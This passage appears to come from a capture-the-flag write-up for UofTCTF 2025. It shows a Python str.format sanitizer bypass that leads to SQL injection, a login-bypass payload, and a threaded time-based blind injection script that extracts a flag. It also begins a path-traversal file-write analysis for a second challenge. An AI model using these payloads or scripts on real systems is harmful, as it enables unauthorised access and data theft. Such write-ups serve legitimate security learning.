</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">raise</span> MaliciousCharacterError(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Malicious character &#39;</span><span style="color:#e6db74">{</span>char<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; found in &#39;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_value</span>(self):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>check_malicious()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">QueryBuilder</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, query_template, dirty_strings):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>query_template <span style="color:#f92672">=</span> query_template
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>dirty_strings <span style="color:#f92672">=</span> {ds<span style="color:#f92672">.</span>key: ds <span style="color:#66d9ef">for</span> ds <span style="color:#f92672">in</span> dirty_strings}
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>placeholders <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_all_placeholders(self<span style="color:#f92672">.</span>query_template)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_all_placeholders</span>(self, query_template<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>        pattern <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\{(\w+)\}&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> pattern<span style="color:#f92672">.</span>findall(query_template)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build_query</span>(self):
</span></span><span style="display:flex;"><span>        query <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>query_template
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;query:&#39;</span>, query, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>placeholders <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_all_placeholders(query)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;placeholders:&#39;</span>, self<span style="color:#f92672">.</span>placeholders, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> self<span style="color:#f92672">.</span>placeholders:
</span></span><span style="display:flex;"><span>            key <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>placeholders[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>            format_map <span style="color:#f92672">=</span> dict<span style="color:#f92672">.</span>fromkeys(self<span style="color:#f92672">.</span>placeholders, <span style="color:#66d9ef">lambda</span> _, k: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">{</span>k<span style="color:#e6db74">}</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;format_map:&#39;</span>, format_map, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>placeholders:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> k <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>dirty_strings:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> key <span style="color:#f92672">==</span> k:
</span></span><span style="display:flex;"><span>                        format_map[k] <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>dirty_strings[k]<span style="color:#f92672">.</span>get_value()
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    format_map[k] <span style="color:#f92672">=</span> DirtyString
</span></span><span style="display:flex;"><span>                    
</span></span><span style="display:flex;"><span>            query <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>format_map(type(<span style="color:#e6db74">&#39;FormatDict&#39;</span>, (), {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;__getitem__&#39;</span>: <span style="color:#66d9ef">lambda</span> _, k: format_map[k] <span style="color:#66d9ef">if</span> isinstance(format_map[k], str) <span style="color:#66d9ef">else</span> format_map[k](<span style="color:#e6db74">&#34;&#34;</span>,k)
</span></span><span style="display:flex;"><span>            })())
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>placeholders <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_all_placeholders(query)
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> query
</span></span></code></pre></div><p>Queries are prepared using this query builder before getting sent to the database:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>	du <span style="color:#f92672">=</span> DirtyString(username, <span style="color:#e6db74">&#39;username&#39;</span>)
</span></span><span style="display:flex;"><span>	dp <span style="color:#f92672">=</span> DirtyString(password, <span style="color:#e6db74">&#39;password&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	qb <span style="color:#f92672">=</span> QueryBuilder(
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;SELECT * FROM users WHERE username = &#39;</span><span style="color:#e6db74">{username}</span><span style="color:#e6db74">&#39; AND password = &#39;</span><span style="color:#e6db74">{password}</span><span style="color:#e6db74">&#39;&#34;</span>,
</span></span><span style="display:flex;"><span>		[du, dp]
</span></span><span style="display:flex;"><span>	)
</span></span><span style="display:flex;"><span>	sanitized_query <span style="color:#f92672">=</span> qb<span style="color:#f92672">.</span>build_query()
</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Sanitized query: </span><span style="color:#e6db74">{</span>sanitized_query<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> (MaliciousCharacterError, NonPrintableCharacterError) <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>	flash(str(e), <span style="color:#e6db74">&#39;error&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;login&#39;</span>))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>	flash(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Invalid credentials because of error. </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#39;error&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;login&#39;</span>))
</span></span></code></pre></div><p>I think we have to abuse the recursive, sequential nature of the placeholder logic. Using <code>username = {password!a}</code> and <code>password</code></p>
<pre tabindex="0"><code>Database query failed: 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;as&#39;&#39; AND password = &#39;as&#39;&#39; at line 1
</code></pre><p>We need to find different gadgets to produce what we need, ideally any ASCII character. We can abuse format and do <code>username = {password.__class__}</code> and we get: <code>Sanitized query: SELECT * FROM users WHERE username = '&lt;class 'str'&gt;' AND password = 'a'</code></p>
<p>Let&rsquo;s further understand what <code>str.format_map</code> does:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># returns 2</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#39;aa </span><span style="color:#e6db74">{d}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format_map(type(<span style="color:#e6db74">&#39;FormatDict&#39;</span>, (), {<span style="color:#e6db74">&#39;__getitem__&#39;</span>: <span style="color:#66d9ef">lambda</span> self,k: <span style="color:#ae81ff">2</span> })())
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;aa 2&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># so pretty much its a function that provides custom functionality on how a key is &#34;mapped&#34; into a value..</span>
</span></span></code></pre></div><p>The function in the code is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;__getitem__&#39;</span>: <span style="color:#66d9ef">lambda</span> _, k: format_map[k] <span style="color:#66d9ef">if</span> isinstance(format_map[k], str) <span style="color:#66d9ef">else</span> format_map[k](<span style="color:#e6db74">&#34;&#34;</span>,k)
</span></span></code></pre></div><ol>
<li>If <code>k</code> is a string in our <code>format_map</code> (That&rsquo;s the dictionary, different from <code>str.format_map</code> method), it&rsquo;s sent as is&hellip;</li>
<li>If <code>k</code> is something else, presumably <code>DirtyString</code>, then we call <code>format_map[k]</code> with two arguments <code>&quot;&quot;</code> and <code>k</code>. In the presumed case, that would lead to creating a <code>DirtyString</code> instance whose value is <code>&quot;&quot;</code>.</li>
</ol>
<p>I see this as a function call gadget, if we can reach an important object or function, we can call it this way&hellip; I daresay we can achieve a call chain.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>username<span style="color:#f92672">=</span>{password<span style="color:#960050;background-color:#1e0010">!</span>a:<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">10</span>}<span style="color:#f92672">&amp;</span>password<span style="color:#f92672">=</span>abc
</span></span><span style="display:flex;"><span>SELECT <span style="color:#f92672">*</span> FROM users WHERE username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>abc<span style="color:#e6db74">&#39;     &#39;</span> AND password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abc&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>username<span style="color:#f92672">=</span>{password<span style="color:#960050;background-color:#1e0010">!</span>a:<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">10</span>}<span style="color:#f92672">&amp;</span>password<span style="color:#f92672">=</span>abc
</span></span><span style="display:flex;"><span>SELECT <span style="color:#f92672">*</span> FROM users WHERE username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;     &#39;</span>abc<span style="color:#e6db74">&#39;&#39;</span> AND password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abc&#39;</span>
</span></span></code></pre></div><p>Using something like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>username<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">{</span>password<span style="color:#f92672">!</span>a<span style="color:#960050;background-color:#1e0010">}</span><span style="color:#66d9ef">or</span><span style="color:#960050;background-color:#1e0010">{</span>password<span style="color:#f92672">!</span>a:<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">}</span><span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">{</span>password<span style="color:#f92672">!</span>a:<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">}</span><span style="color:#66d9ef">or</span><span style="color:#960050;background-color:#1e0010">{</span>password<span style="color:#f92672">!</span>a<span style="color:#960050;background-color:#1e0010">}</span><span style="color:#f92672">&amp;</span>password<span style="color:#f92672">=</span><span style="color:#66d9ef">or</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- we generate this SQL, apparently any +ve number works too with =
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#66d9ef">or</span><span style="color:#e6db74">&#39;or &#39;</span><span style="color:#66d9ef">or</span><span style="color:#e6db74">&#39;1=1 &#39;</span><span style="color:#66d9ef">or</span><span style="color:#e6db74">&#39;or&#39;</span><span style="color:#66d9ef">or</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">AND</span> password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;or&#39;</span>
</span></span></code></pre></div><p>We get <em>Login successful</em>.</p>
<p>We can easily grab strings from any valid python string, like <code>''.__doc__</code> for example! Writing a little custom encoder and a blind injector gives us the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> string <span style="color:#f92672">import</span> ascii_lowercase, digits
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> multiprocessing.pool <span style="color:#f92672">import</span> ThreadPool
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost:5000&#39;</span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://prepared-1-108949fb3d34a1a2.chal.uoftctf.org&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>chars <span style="color:#f92672">=</span> ascii_lowercase <span style="color:#f92672">+</span> digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>docs <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__doc__
</span></span><span style="display:flex;"><span>docstr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{password.__doc__[%d]}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(payload):
</span></span><span style="display:flex;"><span>    encoded <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> payload:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> c <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> chars:
</span></span><span style="display:flex;"><span>            encoded <span style="color:#f92672">+=</span> docstr <span style="color:#f92672">%</span> docs<span style="color:#f92672">.</span>index(c)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;{&#39;</span>, <span style="color:#e6db74">&#39;}&#39;</span>]:
</span></span><span style="display:flex;"><span>            encoded <span style="color:#f92672">+=</span> c <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            encoded <span style="color:#f92672">+=</span> c
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> encoded
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">53</span>):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; union select flag,sleep(1),null from flags where length(flag)=</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">-- &#34;</span> <span style="color:#f92672">%</span> i
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, data<span style="color:#f92672">=</span>dict(username<span style="color:#f92672">=</span>encode(payload), password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>))
</span></span><span style="display:flex;"><span>    print(r<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1.5</span>:
</span></span><span style="display:flex;"><span>        length <span style="color:#f92672">=</span> i
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;flag length:&#39;</span>, length)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_pos</span>(i):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> chars <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;_-</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">!?&#39;</span>:
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; union select flag,sleep(1),null from flags where substring(flag, </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">, 1)=&#39;</span><span style="color:#e6db74">%c</span><span style="color:#e6db74">&#39;-- &#34;</span> <span style="color:#f92672">%</span> (i, c)
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, data<span style="color:#f92672">=</span>dict(username<span style="color:#f92672">=</span>encode(payload), password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1.5</span>:
</span></span><span style="display:flex;"><span>            print(c, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uoftctf{&#39;</span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(ThreadPool(<span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>map(leak_pos, range(<span style="color:#ae81ff">9</span>, length<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)))
</span></span><span style="display:flex;"><span>print(flag)
</span></span></code></pre></div><p>Running our script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>1.848684
</span></span><span style="display:flex;"><span>flag length: <span style="color:#ae81ff">52</span>
</span></span><span style="display:flex;"><span>c m m b r <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">7</span> _ <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">3</span> r _ <span style="color:#ae81ff">0</span> r <span style="color:#ae81ff">3</span> _ c u <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">5</span> u y r <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">3</span> q _ <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span> l m n _ <span style="color:#ae81ff">0</span> _ f _ <span style="color:#ae81ff">7</span> r <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>uoftctf<span style="color:#f92672">{</span>r3m3mb3r_70_c173_y0ur_50urc35_1n_5ql_f0rm47<span style="color:#f92672">}</span>
</span></span></code></pre></div><p><code>uoftctf{r3m3mb3r_70_c173_y0ur_50urc35_1n_5ql_f0rm47}</code></p>
<p><strong>References:</strong></p>
<ul>
<li><a href="https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/">https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/</a></li>
</ul>
<h1 id="timeless">Timeless<a href="#timeless" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>A blog website where you can add new posts, upload a profile picture and write your bio. Posts can be public or not public. An RCE is required.</p>
<p><img src="/posts/uoft-2025-ctf/timeless_blog.png"></p>
<p>I immediately recognize an unsafe path concatenation with user-controlled input in the upload functionality,  I think this is integral to the challenge.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># helpers.py</span>
</span></span><span style="display:flex;"><span>ALLOWED_EXTENSIONS <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;png&#39;</span>, <span style="color:#e6db74">&#39;jpeg&#39;</span>, <span style="color:#e6db74">&#39;jpg&#39;</span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">allowed_username</span>(username):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;..&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> username
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">allowed_file</span>(filename):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">not</span> (<span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">in</span> filename <span style="color:#f92672">and</span> (filename<span style="color:#f92672">.</span>rsplit(<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>lower() <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> ALLOWED_EXTENSIONS <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;..&#34;</span> <span style="color:#f92672">in</span> filename))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_filename</span>(username, filename, timestamp<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> timestamp:
</span></span><span style="display:flex;"><span>        timestamp <span style="color:#f92672">=</span> int(datetime<span style="color:#f92672">.</span>now()<span style="color:#f92672">.</span>timestamp())
</span></span><span style="display:flex;"><span>    hash_value <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">_</span><span style="color:#e6db74">{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">_</span><span style="color:#e6db74">{</span>timestamp<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hash_value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ensure_upload_directory</span>(base_path, username):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> allowed_username(username):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    user_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(base_path, username)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(user_directory):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> user_directory
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>makedirs(user_directory, exist_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> user_directory
</span></span></code></pre></div><p>Even though we can&rsquo;t have <code>..</code> or <code>.</code> in the filename, by creating a username of <code>/tmp/passwd</code>, we get an arbitrary file write:</p>
<pre tabindex="0"><code>$ ls /tmp/passwd
3f33712d6754403bb475ca9eb8a0e40d.jpg
</code></pre><p>We identify a <code>/status</code> endpoint allowing us to get the time:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;ok&#34;</span>,<span style="color:#e6db74">&#34;server_time&#34;</span>:<span style="color:#e6db74">&#34;2025-01-12 12:10:12.694911&#34;</span>,<span style="color:#e6db74">&#34;uptime&#34;</span>:<span style="color:#e6db74">&#34;10:38:26.305844&#34;</span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>In <code>config.py</code>, we have predictable secrets:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Config</span>:
</span></span><span style="display:flex;"><span>    JSON_SORT_KEYS <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    START_TIME <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>now()
</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>seed(int(START_TIME<span style="color:#f92672">.</span>timestamp()))
</span></span><span style="display:flex;"><span>    SECRET_KEY <span style="color:#f92672">=</span> str(uuid<span style="color:#f92672">.</span>uuid1(clock_seq<span style="color:#f92672">=</span>random<span style="color:#f92672">.</span>getrandbits(<span style="color:#ae81ff">14</span>)))
</span></span><span style="display:flex;"><span>    SESSION_USE_SIGNER <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    TEMPLATES_AUTO_RELOAD <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    SESSION_PERMANENT <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    SESSION_TYPE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;filesystem&#39;</span>
</span></span><span style="display:flex;"><span>    SQLALCHEMY_DATABASE_URI <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;sqlite:///</span><span style="color:#e6db74">{</span>os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#39;db&#39;</span>, <span style="color:#e6db74">&#39;app.db&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    SQLALCHEMY_TRACK_MODIFICATIONS <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    UPLOAD_FOLDER <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#39;uploads&#39;</span>)
